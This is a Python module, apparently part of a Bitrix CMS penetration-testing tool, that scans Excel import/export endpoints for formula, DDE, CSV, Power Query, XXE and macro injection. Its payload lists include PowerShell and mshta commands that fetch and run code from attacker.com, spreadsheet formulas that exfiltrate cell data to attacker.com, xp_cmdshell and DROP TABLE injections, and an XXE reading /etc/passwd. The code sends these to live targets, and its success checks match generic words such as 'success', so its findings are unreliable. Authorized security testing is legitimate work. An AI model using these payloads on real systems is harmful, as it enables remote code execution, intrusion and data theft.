#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Excel RCE Scanner Module for Bitrix Pentest Tool
Tests for: Excel formula injection, CSV injection, DDE attacks,
Power Query exploits, Macro-based RCE via import/export functionality
Based on: https://pentestnotes.ru/notes/bitrix_excel_rce/
"""

import re
import base64
import random
import string
from urllib.parse import urljoin, quote, parse_qs
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field, asdict


@dataclass
class ExcelRCEFinding:
    """Excel RCE vulnerability finding"""
    severity: str  # critical, high, medium, low
    vuln_type: str  # formula_injection, dde_injection, csv_injection, power_query, macro_injection, dynamic_data_exchange
    url: str
    parameter: Optional[str]
    payload: str
    description: str
    evidence: Optional[str] = None
    execution_confirmed: bool = False  # Whether RCE was confirmed
    file_type: Optional[str] = None  # xlsx, csv, xls, etc.
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class ExcelRCEResult:
    """Results of Excel RCE scanning"""
    target: str
    findings: List[ExcelRCEFinding] = field(default_factory=list)
    formula_injections: List[Dict] = field(default_factory=list)
    dde_injections: List[Dict] = field(default_factory=list)
    csv_injections: List[Dict] = field(default_factory=list)
    power_query_vulns: List[Dict] = field(default_factory=list)
    macro_vulns: List[Dict] = field(default_factory=list)
    exposed_export_points: List[str] = field(default_factory=list)
    
    def add_finding(self, finding: ExcelRCEFinding):
        self.findings.append(finding)
        
        finding_dict = finding.to_dict()
        if finding.vuln_type == 'formula_injection':
            self.formula_injections.append(finding_dict)
        elif finding.vuln_type == 'dde_injection':
            self.dde_injections.append(finding_dict)
        elif finding.vuln_type == 'csv_injection':
            self.csv_injections.append(finding_dict)
        elif finding.vuln_type == 'power_query':
            self.power_query_vulns.append(finding_dict)
        elif finding.vuln_type == 'macro_injection':
            self.macro_vulns.append(finding_dict)
    
    def get_critical_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'critical')
    
    def get_high_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'high')
    
    def get_medium_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'medium')
    
    def get_low_count(self) -> int:
        return sum(1 for f in self.findings if f.severity == 'low')
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            'target': self.target,
            'summary': {
                'total_findings': len(self.findings),
                'critical': self.get_critical_count(),
                'high': self.get_high_count(),
                'medium': self.get_medium_count(),
                'low': self.get_low_count(),
                'formula_injections': len(self.formula_injections),
                'dde_injections': len(self.dde_injections),
                'csv_injections': len(self.csv_injections),
                'power_query_vulns': len(self.power_query_vulns),
                'macro_vulns': len(self.macro_vulns),
                'exposed_export_points': len(self.exposed_export_points),
            },
            'exposed_export_points': self.exposed_export_points,
            'all_findings': [f.to_dict() for f in self.findings]
        }


class BitrixExcelRCEScanner:
    """
    Excel RCE scanner specialized for Bitrix CMS
    Based on pentestnotes.ru research about Excel formula injection
    """
    
    # Excel formula injection payloads (DDE - Dynamic Data Exchange)
    DDE_PAYLOADS = [
        # Basic DDE execution
        '=cmd|\' /c calc\'!A0',
        '=cmd|\' /c notepad\'!A0',
        '=cmd|\' /c whoami > C:\\\\Windows\\\\Temp\\\\test.txt\'!A0',
        
        # PowerShell execution
        '=powershell|\' -c "IEX(New-Object Net.WebClient).downloadString(\'http://attacker.com/shell.ps1\')"\'!A0',
        '=powershell|\' -Command "Start-Process cmd -ArgumentList \'/c whoami\'"\'!A0',
        
        # MSHTA execution
        '=mshta|\'http://attacker.com/payload.hta\'!A0',
        
        # WMI execution
        '=wmi|\'winmgmts:process!Create "cmd.exe /c whoami"\'!A0',
        
        # Shell execution via various methods
        '=shell|\'/bin/sh -c "id"\'!A0',
        '=shell|\'cmd.exe /c whoami\'!A0',
        
        # MSEXCEL specific
        '=msexcel|\'/e/../../../../Windows/System32/calc.exe\'!A0',
        
        # Obfuscated variants
        '=cMd|\' /c calc\'!A0',
        '=CmD|\' /c calc\'!A0',
        '=+cmd|\' /c calc\'!A0',
        '=-cmd|\' /c calc\'!A0',
        '=@cmd|\' /c calc\'!A0',
        
        # CSV injection variants
        '=cmd|\' /c calc\'!A0',
        '+cmd|\' /c calc\'!A0',
        '-cmd|\' /c calc\'!A0',
        '@cmd|\' /c calc\'!A0',
        '\t=cmd|\' /c calc\'!A0',
        '\r\n=cmd|\' /c calc\'!A0',
    ]
    
    # Power Query / External Data payloads
    POWER_QUERY_PAYLOADS = [
        # External data connections
        'http://attacker.com/malicious.xlsx',
        'https://attacker.com/data.xml',
        '\\\\attacker.com\\share\\payload.xlsx',
        'file://///attacker.com/share/payload.xlsx',
        
        # SQL injection via Power Query
        '"; DROP TABLE users; --',
        '\'; EXEC xp_cmdshell(\'whoami\'); --',
        
        # Command injection in connection strings
        'Data Source=localhost;Initial Catalog=test;User ID=sa;Password="; EXEC xp_cmdshell(\'calc\'); --',
    ]
    
    # CSV Injection payloads
    CSV_INJECTION_PAYLOADS = [
        # Formula injection
        '=cmd|\' /c calc\'!A0',
        '=HYPERLINK("http://attacker.com")',
        '=IMPORTXML("http://attacker.com", "//a")',
        '=WEBSERVICE("http://attacker.com/exfil?data=" & A1)',
        
        # JavaScript execution (when opened in browser)
        '<script>alert(1)</script>',
        '<img src=x onerror=alert(1)>',
        'javascript:alert(1)',
        
        # Data exfiltration
        '=IMPORTDATA("http://attacker.com/?leak=" & A1)',
    ]
    
    # Macro-based payloads (XLSM)
    MACRO_PAYLOADS = [
        # Embedded macro indicators
        'Sub Auto_Open()',
        'Sub Workbook_Open()',
        'Sub Document_Open()',
        'Shell("cmd.exe /c whoami")',
        'CreateObject("WScript.Shell").Run',
        'ActiveXObject("WScript.Shell")',
    ]
    
    # XXE via Excel (Office Open XML)
    XXE_EXCEL_PAYLOADS = [
        # External entity in Excel XML
        '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">
<sheetData><row><c t="str"><v>&xxe;</v></c></row></sheetData>
</worksheet>''',
        
        # External stylesheet reference
        '''<?xml version="1.0"?>
<?xml-stylesheet type="text/xsl" href="http://attacker.com/style.xsl"?>
<worksheet></worksheet>''',
    ]
    
    # Bitrix-specific Excel import/export endpoints
    BITRIX_EXCEL_ENDPOINTS = [
        {
            'name': 'Catalog Export',
            'url': '/bitrix/admin/cat_export_setup.php',
            'type': 'export',
            'method': 'GET',
            'params': ['IBLOCK_ID', 'EXPORT_FORMAT', 'FILE_NAME']
        },
        {
            'name': 'Catalog Import',
            'url': '/bitrix/admin/cat_import.php',
            'type': 'import',
            'method': 'POST',
            'params': ['IMPORT_FILE', 'IBLOCK_ID', 'URL_FILE']
        },
        {
            'name': 'Highload Export',
            'url': '/bitrix/tools/highloadblock_export.php',
            'type': 'export',
            'method': 'GET',
            'params': ['ENTITY_ID', 'EXPORT_FORMAT']
        },
        {
            'name': 'Highload Import',
            'url': '/bitrix/tools/highloadblock_import.php',
            'type': 'import',
            'method': 'POST',
            'params': ['IMPORT_FILE', 'ENTITY_ID']
        },
        {
            'name': 'Sale Export',
            'url': '/bitrix/admin/sale_export.php',
            'type': 'export',
            'method': 'GET',
            'params': ['EXPORT_FORMAT', 'FILE_NAME']
        },
        {
            'name': 'User Export',
            'url': '/bitrix/admin/user_export.php',
            'type': 'export',
            'method': 'GET',
            'params': ['EXPORT_FORMAT']
        },
        {
            'name': 'Report Excel Export',
            'url': '/bitrix/admin/report_view.php',
            'type': 'export',
            'method': 'GET',
            'params': ['EXPORT_TYPE', 'REPORT_ID']
        },
        {
            'name': 'CRM Export',
            'url': '/crm/configs/export/',
            'type': 'export',
            'method': 'GET',
            'params': ['type', 'entity_type']
        },
        {
            'name': 'Excel Handler',
            'url': '/bitrix/tools/excel_handler.php',
            'type': 'handler',
            'method': 'POST',
            'params': ['file', 'action']
        },
        {
            'name': 'CSV Import',
            'url': '/bitrix/admin/csv_import.php',
            'type': 'import',
            'method': 'POST',
            'params': ['IMPORT_FILE', 'DATA_FILE']
        },
    ]
    
    # File extensions to test
    TEST_EXTENSIONS = ['.xlsx', '.xls', '.csv', '.xlsm', '.xlsb', '.ods']
    
    def __init__(self, requester, logger, parser):
        self.requester = requester
        self.logger = logger
        self.parser = parser
        self.callback_server = None  # For detecting callback
        
    def scan(self, target_url: str, aggressive: bool = False) -> ExcelRCEResult:
        """
        Main Excel RCE scanning method
        
        Args:
            target_url: Target base URL
            aggressive: Enable aggressive testing (actual payload execution attempts)
        
        Returns:
            ExcelRCEResult with all findings
        """
        self.logger.info(f"Starting Excel RCE scan for {target_url}")
        result = ExcelRCEResult(target=target_url)
        
        base_url = self._normalize_url(target_url)
        
        # 1. Discover Excel import/export endpoints
        self.logger.info("Discovering Excel import/export endpoints...")
        endpoints = self._discover_endpoints(base_url)
        
        # 2. Test for formula injection in export functionality
        self.logger.info("Testing formula injection in exports...")
        self._test_formula_injection(base_url, endpoints, result)
        
        # 3. Test for CSV injection
        self.logger.info("Testing CSV injection vectors...")
        self._test_csv_injection(base_url, endpoints, result)
        
        # 4. Test for Power Query / External Data
        self.logger.info("Testing Power Query vulnerabilities...")
        self._test_power_query(base_url, endpoints, result)
        
        # 5. Test for DDE injection
        self.logger.info("Testing DDE injection...")
        self._test_dde_injection(base_url, endpoints, result)
        
        # 6. Test for XXE via Excel (if aggressive)
        if aggressive:
            self.logger.info("Testing XXE via Excel files...")
            self._test_xxe_excel(base_url, endpoints, result)
        
        # 7. Test for macro injection
        self.logger.info("Testing macro injection...")
        self._test_macro_injection(base_url, endpoints, result)
        
        # 8. Check for exposed export files
        self.logger.info("Checking for exposed export files...")
        self._check_exposed_exports(base_url, result)
        
        # Summary
        total = len(result.findings)
        critical = result.get_critical_count()
        self.logger.info(f"Excel RCE scan complete: {total} findings ({critical} critical)")
        
        if result.exposed_export_points:
            self.logger.warning(f"Exposed export points: {len(result.exposed_export_points)}")
        
        return result
    
    def _normalize_url(self, url: str) -> str:
        """Normalize URL"""
        if not url.startswith(('http://', 'https://')):
            url = 'https://' + url
        return url.rstrip('/')
    
    def _discover_endpoints(self, base_url: str) -> List[Dict]:
        """Discover available Excel import/export endpoints"""
        discovered = []
        
        for endpoint in self.BITRIX_EXCEL_ENDPOINTS:
            url = urljoin(base_url, endpoint['url'])
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp:
                    # Check if endpoint exists (not 404)
                    if resp.status_code in [200, 401, 403, 302]:
                        discovered.append({
                            **endpoint,
                            'full_url': url,
                            'accessible': resp.status_code == 200,
                            'response_code': resp.status_code
                        })
                        
                        if resp.status_code == 200:
                            self.logger.info(f"Found Excel endpoint: {endpoint['name']}")
                        
            except Exception as e:
                self.logger.debug(f"Error checking {endpoint['url']}: {e}")
        
        return discovered
    
    def _test_formula_injection(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for formula injection in Excel exports"""
        # Test by injecting formula-like data into fields that get exported
        
        # Common Bitrix fields that might be exported
        test_fields = {
            'NAME': '=cmd|\' /c calc\'!A0',
            'PREVIEW_TEXT': '=powershell|\' -c "whoami"\'!A0',
            'DETAIL_TEXT': '=mshta|\'http://attacker.com/payload.hta\'!A0',
            'PROPERTY_VALUES': '=wmi|\'winmgmts:process!Create "calc"\'!A0',
            'TITLE': '=HYPERLINK("http://attacker.com", "Click")',
        }
        
        # Test export functionality
        export_endpoints = [e for e in endpoints if e['type'] == 'export']
        
        for endpoint in export_endpoints:
            url = endpoint['full_url']
            
            # Test with formula injection in parameters
            for param in endpoint['params']:
                for payload in self.DDE_PAYLOADS[:3]:  # Test first 3 payloads
                    try:
                        test_params = {param: payload}
                        resp = self.requester.get(url, params=test_params, timeout=15)
                        
                        if resp and self._detect_formula_execution(resp):
                            finding = ExcelRCEFinding(
                                severity='critical',
                                vuln_type='formula_injection',
                                url=url,
                                parameter=param,
                                payload=payload,
                                description='Formula injection in Excel export parameter',
                                evidence=resp.text[:300],
                                file_type='xlsx'
                            )
                            result.add_finding(finding)
                            self.logger.critical(f"!!! FORMULA INJECTION: {endpoint['name']} param={param}")
                            
                    except Exception as e:
                        self.logger.debug(f"Formula injection test error: {e}")
    
    def _detect_formula_execution(self, response) -> bool:
        """Detect if formula was executed or accepted"""
        indicators = [
            'DDE',
            'Microsoft Excel',
            'Security Warning',
            'External data connections',
            'calc.exe',
            'powershell',
            'cmd.exe',
            'whoami',
        ]
        
        content = response.text[:2000] if response.text else ''
        headers = str(response.headers)
        
        combined = content + headers
        return any(ind.lower() in combined.lower() for ind in indicators)
    
    def _test_csv_injection(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for CSV injection vulnerabilities"""
        csv_endpoints = [e for e in endpoints if 'csv' in e['url'].lower() or e['type'] == 'import']
        
        for endpoint in csv_endpoints:
            url = endpoint['full_url']
            
            for payload in self.CSV_INJECTION_PAYLOADS:
                try:
                    # Test via file upload simulation
                    files = {
                        'IMPORT_FILE': ('test.csv', payload, 'text/csv'),
                    }
                    
                    data = {'IBLOCK_ID': '1'} if 'IBLOCK_ID' in endpoint['params'] else {}
                    
                    resp = self.requester.post(url, data=data, files=files, timeout=15)
                    
                    if resp and self._detect_csv_injection_success(resp):
                        finding = ExcelRCEFinding(
                            severity='high',
                            vuln_type='csv_injection',
                            url=url,
                            parameter='IMPORT_FILE',
                            payload=payload[:50],
                            description='CSV injection vulnerability',
                            evidence=resp.text[:300],
                            file_type='csv'
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! CSV INJECTION: {endpoint['name']}")
                        
                except Exception as e:
                    self.logger.debug(f"CSV injection test error: {e}")
    
    def _detect_csv_injection_success(self, response) -> bool:
        """Detect successful CSV injection"""
        indicators = [
            'imported successfully',
            'data imported',
            'success',
            'успешно импортирован',
            'импорт завершен',
        ]
        
        content = response.text[:1000] if response.text else ''
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _test_power_query(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for Power Query / External Data vulnerabilities"""
        # Test external data connections in Excel files
        
        for payload in self.POWER_QUERY_PAYLOADS:
            try:
                # Test via URL parameter if supported
                test_url = f"{base_url}/bitrix/admin/cat_import.php?URL_FILE={quote(payload)}"
                resp = self.requester.get(test_url, timeout=10)
                
                if resp and resp.status_code == 200:
                    # Check if external URL is accepted
                    if self._detect_external_data_accepted(resp):
                        finding = ExcelRCEFinding(
                            severity='critical',
                            vuln_type='power_query',
                            url=test_url,
                            parameter='URL_FILE',
                            payload=payload,
                            description='Power Query external data connection vulnerability',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! POWER QUERY RCE: External data connection accepted")
                        
            except Exception as e:
                self.logger.debug(f"Power Query test error: {e}")
    
    def _detect_external_data_accepted(self, response) -> bool:
        """Detect if external data connection was accepted"""
        indicators = [
            'downloading',
            'external data',
            'connection',
            'power query',
            'data source',
        ]
        
        content = response.text[:1000] if response.text else ''
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _test_dde_injection(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for DDE (Dynamic Data Exchange) injection"""
        # DDE is specific to Windows Excel and can lead to RCE
        
        dde_test_cases = [
            {'field': 'NAME', 'value': '=cmd|\' /c calc\'!A0'},
            {'field': 'PREVIEW_TEXT', 'value': '=powershell|\' -c "IEX(...)"\'!A0'},
            {'field': 'CODE', 'value': '=mshta|\'http://attacker.com\'!A0'},
        ]
        
        for endpoint in endpoints:
            if endpoint['type'] != 'import':
                continue
            
            url = endpoint['full_url']
            
            for test_case in dde_test_cases:
                try:
                    # Simulate import with DDE payload
                    data = {
                        'IBLOCK_ID': '1',
                        test_case['field']: test_case['value']
                    }
                    
                    resp = self.requester.post(url, data=data, timeout=15)
                    
                    if resp and self._detect_dde_accepted(resp):
                        finding = ExcelRCEFinding(
                            severity='critical',
                            vuln_type='dde_injection',
                            url=url,
                            parameter=test_case['field'],
                            payload=test_case['value'],
                            description='DDE injection vulnerability - potential RCE when file opened',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! DDE INJECTION: {endpoint['name']} field={test_case['field']}")
                        
                except Exception as e:
                    self.logger.debug(f"DDE test error: {e}")
    
    def _detect_dde_accepted(self, response) -> bool:
        """Detect if DDE payload was accepted"""
        # If data is accepted without sanitization, it's vulnerable
        indicators = [
            'success',
            'imported',
            'saved',
            'обновлено',
            'добавлено',
        ]
        
        content = response.text[:1000] if response.text else ''
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _test_xxe_excel(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for XXE via Excel file upload (Office Open XML)"""
        # Excel files are ZIP archives containing XML
        
        for payload in self.XXE_EXCEL_PAYLOADS:
            try:
                # Create a minimal XLSX structure with XXE
                xlsx_structure = self._create_malicious_xlsx(payload)
                
                for endpoint in endpoints:
                    if endpoint['type'] != 'import':
                        continue
                    
                    url = endpoint['full_url']
                    
                    files = {
                        'IMPORT_FILE': ('test.xlsx', xlsx_structure, 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'),
                    }
                    
                    resp = self.requester.post(url, files=files, timeout=15)
                    
                    if resp and self._detect_xxe_success(resp.text):
                        finding = ExcelRCEFinding(
                            severity='critical',
                            vuln_type='formula_injection',
                            url=url,
                            parameter='IMPORT_FILE',
                            payload='XXE in Excel XML',
                            description='XXE vulnerability via Excel file upload',
                            evidence=resp.text[:300],
                            file_type='xlsx'
                        )
                        result.add_finding(finding)
                        self.logger.critical(f"!!! XXE via EXCEL: {endpoint['name']}")
                        
            except Exception as e:
                self.logger.debug(f"XXE Excel test error: {e}")
    
    def _create_malicious_xlsx(self, xml_payload: str) -> bytes:
        """Create a minimal malicious XLSX file with XXE"""
        # This is a simplified representation
        # Real implementation would create proper ZIP structure
        
        import io
        import zipfile
        
        xlsx_buffer = io.BytesIO()
        
        with zipfile.ZipFile(xlsx_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # [Content_Types].xml
            content_types = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
<Default Extension="xml" ContentType="application/xml"/>
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"/>
<Override PartName="/xl/worksheets/sheet1.xml" ContentType="application/vnd.openxmlformats-officedocument.spreadsheetml.worksheet+xml"/>
</Types>'''
            zf.writestr('[Content_Types].xml', content_types)
            
            # _rels/.rels
            rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="xl/workbook.xml"/>
</Relationships>'''
            zf.writestr('_rels/.rels', rels)
            
            # xl/workbook.xml
            workbook = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<workbook xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
<sheets><sheet name="Sheet1" sheetId="1" r:id="rId1"/></sheets>
</workbook>'''
            zf.writestr('xl/workbook.xml', workbook)
            
            # xl/_rels/workbook.xml.rels
            workbook_rels = '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
<Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet" Target="worksheets/sheet1.xml"/>
</Relationships>'''
            zf.writestr('xl/_rels/workbook.xml.rels', workbook_rels)
            
            # xl/worksheets/sheet1.xml (with XXE)
            zf.writestr('xl/worksheets/sheet1.xml', xml_payload)
        
        return xlsx_buffer.getvalue()
    
    def _detect_xxe_success(self, content: str) -> bool:
        """Detect successful XXE exploitation"""
        indicators = [
            'root:x:',
            'etc/passwd',
            'DBHost',
            'DBPassword',
            'bitrix',
            'windows',
            'system32',
        ]
        return any(ind in content for ind in indicators)
    
    def _test_macro_injection(self, base_url: str, endpoints: List[Dict], result: ExcelRCEResult):
        """Test for macro injection in Excel files"""
        # Test if XLSM files with macros are accepted
        
        xlsm_payload = self._create_macro_xlsm()
        
        for endpoint in endpoints:
            if endpoint['type'] != 'import':
                continue
            
            url = endpoint['full_url']
            
            try:
                files = {
                    'IMPORT_FILE': ('test.xlsm', xlsm_payload, 'application/vnd.ms-excel.sheet.macroEnabled.12'),
                }
                
                resp = self.requester.post(url, files=files, timeout=15)
                
                if resp and self._detect_macro_accepted(resp):
                    finding = ExcelRCEFinding(
                        severity='critical',
                        vuln_type='macro_injection',
                        url=url,
                        parameter='IMPORT_FILE',
                        payload='Macro-enabled Excel file',
                        description='Macro-enabled Excel files accepted - potential RCE',
                        evidence=resp.text[:300],
                        file_type='xlsm'
                    )
                    result.add_finding(finding)
                    self.logger.critical(f"!!! MACRO INJECTION: {endpoint['name']} accepts XLSM files")
                    
            except Exception as e:
                self.logger.debug(f"Macro test error: {e}")
    
    def _create_macro_xlsm(self) -> bytes:
        """Create a minimal XLSM file with macro indicator"""
        # Simplified - real implementation would create proper structure
        import io
        import zipfile
        
        xlsm_buffer = io.BytesIO()
        
        with zipfile.ZipFile(xlsm_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
            # Minimal structure indicating macro presence
            zf.writestr('[Content_Types].xml', '<?xml version="1.0"?><Types></Types>')
            zf.writestr('xl/vbaProject.bin', 'Dummy VBA project')
        
        return xlsm_buffer.getvalue()
    
    def _detect_macro_accepted(self, response) -> bool:
        """Detect if macro file was accepted"""
        indicators = [
            'success',
            'imported',
            'xlsm',
            'macro',
            'vba',
        ]
        
        content = response.text[:1000] if response.text else ''
        return any(ind.lower() in content.lower() for ind in indicators)
    
    def _check_exposed_exports(self, base_url: str, result: ExcelRCEResult):
        """Check for exposed export files"""
        export_paths = [
            '/upload/catalog_export/',
            '/bitrix/upload/catalog_export/',
            '/upload/1c_exchange/',
            '/bitrix/export/',
            '/export/',
            '/upload/crm_export/',
        ]
        
        for path in export_paths:
            url = urljoin(base_url, path)
            try:
                resp = self.requester.get(url, timeout=10)
                
                if resp and resp.status_code == 200:
                    # Check for directory listing or exposed files
                    if self._is_directory_listing(resp.text):
                        finding = ExcelRCEFinding(
                            severity='medium',
                            vuln_type='formula_injection',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='Exposed export directory with potentially sensitive Excel files',
                            evidence=resp.text[:300]
                        )
                        result.add_finding(finding)
                        self.logger.warning(f"Exposed export directory: {path}")
                        result.exposed_export_points.append(url)
                    
                    # Check for Excel files
                    elif '.xlsx' in resp.text or '.xls' in resp.text:
                        finding = ExcelRCEFinding(
                            severity='low',
                            vuln_type='formula_injection',
                            url=url,
                            parameter=None,
                            payload=None,
                            description='Potentially exposed Excel export files',
                            evidence=resp.text[:200]
                        )
                        result.add_finding(finding)
                        self.logger.info(f"Potential exposed Excel files: {path}")
                        
            except Exception as e:
                self.logger.debug(f"Export check error for {path}: {e}")
    
    def _is_directory_listing(self, content: str) -> bool:
        """Check if response is a directory listing"""
        indicators = [
            'Index of',
            '<title>Index of',
            'Directory Listing',
            'Parent Directory',
        ]
        return any(ind in content for ind in indicators)


# Testing
if __name__ == "__main__":
    import sys
    import logging
    sys.path.append('..')
    
    from utils.requester import Requester
    from utils.logger import ColoredLogger
    from utils.parser import BitrixParser
    
    logger = ColoredLogger(level=logging.DEBUG)
    requester = Requester()
    parser = BitrixParser()
    
    scanner = BitrixExcelRCEScanner(requester, logger, parser)
    
    if len(sys.argv) > 1:
        result = scanner.scan(sys.argv[1], aggressive=True)
        print(f"\n{'='*60}")
        print(f"CRITICAL: {result.get_critical_count()}")
        print(f"Formula Injections: {len(result.formula_injections)}")
        print(f"DDE Injections: {len(result.dde_injections)}")
        print(f"CSV Injections: {len(result.csv_injections)}")
        print(f"Power Query Vulns: {len(result.power_query_vulns)}")
        print(f"Macro Vulns: {len(result.macro_vulns)}")
        print(f"Exposed Exports: {len(result.exposed_export_points)}")
        print(f"Findings: {len(result.findings)}")